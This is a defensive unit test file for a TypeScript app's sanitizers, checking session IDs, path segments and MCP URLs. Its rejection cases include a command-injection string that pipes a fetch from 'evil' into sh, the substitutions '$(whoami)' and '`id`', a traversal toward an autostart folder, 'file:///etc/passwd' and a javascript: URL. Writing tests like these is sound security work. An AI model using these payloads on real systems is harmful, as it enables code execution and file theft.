/**
 * Unit tests for the pixel-office boundary sanitizers (command-injection,
 * path-traversal, and MCP-URL guards).
 * Run: `npm test` (node's built-in test runner + TS type-stripping).
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { isValidSessionId, safeSeg, safeMcpUrl } from '../src/main/officeSanitize.ts'

test('isValidSessionId accepts UUID-like transcript stems', () => {
  assert.ok(isValidSessionId('9f8c2e1a-0b3d-4c5e-8f9a-1b2c3d4e5f60'))
  assert.ok(isValidSessionId('abc_123-XYZ'))
})

test('isValidSessionId rejects shell metacharacters and injection payloads', () => {
  for (const bad of [
    'x;curl${IFS}evil|sh',
    'a b',
    'a;b',
    '$(whoami)',
    '`id`',
    'a"b',
    "a'b",
    'a|b',
    'a&b',
    'a\nb',
    '../x',
    '',
    'x'.repeat(65),
  ]) {
    assert.equal(isValidSessionId(bad), false, `should reject: ${JSON.stringify(bad)}`)
  }
})

test('isValidSessionId rejects non-strings', () => {
  assert.equal(isValidSessionId(undefined), false)
  assert.equal(isValidSessionId(null), false)
  assert.equal(isValidSessionId(42 as unknown), false)
})

test('safeSeg strips separators, traversal and leading dots', () => {
  assert.equal(safeSeg('../../../.config/autostart'), 'configautostart')
  assert.equal(safeSeg('..'), 'x')
  assert.equal(safeSeg('a/b\\c'), 'abc')
  assert.equal(safeSeg('.hidden'), 'hidden')
  assert.equal(safeSeg('good-slug_1.2'), 'good-slug_1.2')
  assert.equal(safeSeg(''), 'x')
  assert.equal(safeSeg(undefined), 'x')
})

test('safeSeg never yields a path separator', () => {
  for (const s of ['a/b', 'a\\b', 'a\0b', 'a..b/../c']) {
    const out = safeSeg(s)
    assert.ok(!/[/\\]/.test(out), `no separator in ${out}`)
  }
})

test('safeMcpUrl accepts only same-origin http(s), else falls back', () => {
  const base = 'https://office.example.com'
  const fb = 'https://office.example.com/api/office-mcp'
  // same origin honoured
  assert.equal(safeMcpUrl('https://office.example.com/api/office-mcp', base, fb), 'https://office.example.com/api/office-mcp')
  // off-origin rejected
  assert.equal(safeMcpUrl('https://evil.example.com/mcp', base, fb), fb)
  // non-http scheme rejected
  assert.equal(safeMcpUrl('file:///etc/passwd', base, fb), fb)
  assert.equal(safeMcpUrl('javascript:alert(1)', base, fb), fb)
  // garbage / empty / non-string rejected
  assert.equal(safeMcpUrl('not a url', base, fb), fb)
  assert.equal(safeMcpUrl('', base, fb), fb)
  assert.equal(safeMcpUrl(undefined, base, fb), fb)
})
